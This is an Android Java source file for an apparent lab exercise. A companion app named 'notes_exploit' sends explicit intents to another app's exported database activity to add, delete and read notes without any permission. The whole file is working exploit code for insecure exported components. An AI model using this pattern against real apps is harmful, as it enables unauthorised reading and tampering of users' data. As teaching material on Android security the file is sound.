package tcs.lbs.notes_exploit;

import androidx.appcompat.app.AppCompatActivity;
import android.os.Bundle;
import android.widget.EditText;
import android.widget.Toast;
import android.content.Intent;

public class MainActivity extends AppCompatActivity
{

    private static final int REQUEST_SHOW_NOTE = 1001;
    EditText editText;
    private static final String NOTES_PACKAGE = "tcs.lbs.notes";
    private static final String DATABASE_ACTIVITY = "tcs.lbs.notes.DataBaseActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    // Reads a text from 'editText' and add it to the database of notes app
    public void addClicked(android.view.View view)
    {
        editText = findViewById(R.id.add_editText);
        String noteText = editText.getText().toString().trim();

        if (noteText.isEmpty()) {
            Toast.makeText(this, "Please enter note text", Toast.LENGTH_SHORT).show();
            return;
        }

        Intent intent = new Intent();
        intent.setClassName(NOTES_PACKAGE, DATABASE_ACTIVITY);

        intent.putExtra("ACTION_NAME", "SAVE_ITEM");
        intent.putExtra("NOTE_ID", "NEW_ID");
        intent.putExtra("NOTE_TEXT", noteText);

        try {
            startActivity(intent);
            Toast.makeText(this, "Note added successfully!", Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            Toast.makeText(this, "Failed to add note: "+ e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    // Reads a note's ID from 'editText' and remove that note from database
    public void removeClicked(android.view.View view)
    {
        editText = findViewById(R.id.remove_editText);
        String noteId = editText.getText().toString().trim();

        if (noteId.isEmpty()) {
            Toast.makeText(this, "Please enter note ID", Toast.LENGTH_SHORT).show();
            return;
        }

        Intent intent = new Intent();
        intent.setClassName(NOTES_PACKAGE, DATABASE_ACTIVITY);

        intent.putExtra("ACTION_NAME", "DELETE_ITEM");
        intent.putExtra("NOTE_ID", noteId);

        try {
            startActivity(intent);
            Toast.makeText(this, "Note deleted successfully!", Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            Toast.makeText(this, "Failed to delete note: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    // Reads a note's ID from 'editText' and show the text of that note in a Toast Message
    public void showClicked(android.view.View view)
    {
        editText = findViewById(R.id.show_editText);
        String noteId = editText.getText().toString().trim();

        if (noteId.isEmpty()) {
            Toast.makeText(this, "Please enter node ID", Toast.LENGTH_SHORT).show();
            return;
        }

        Intent intent = new Intent();
        intent.setClassName(NOTES_PACKAGE, DATABASE_ACTIVITY);

        intent.putExtra("ACTION_NAME", "GET_ITEM_TEXT");
        intent.putExtra("NOTE_ID", noteId);

        try {
            startActivityForResult(intent, REQUEST_SHOW_NOTE);
        } catch (Exception e) {
            Toast.makeText(this, "Failed to get note: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == REQUEST_SHOW_NOTE && resultCode == RESULT_OK && data != null) {
            String noteText = data.getStringExtra("ITEM_TEXT");
            if (noteText != null && !noteText.isEmpty()) {
                Toast.makeText(this, "Note Content: " + noteText, Toast.LENGTH_LONG).show();
            } else {
                Toast.makeText(this, "Note not found or empty", Toast.LENGTH_SHORT).show();
            }
        }
    }
}

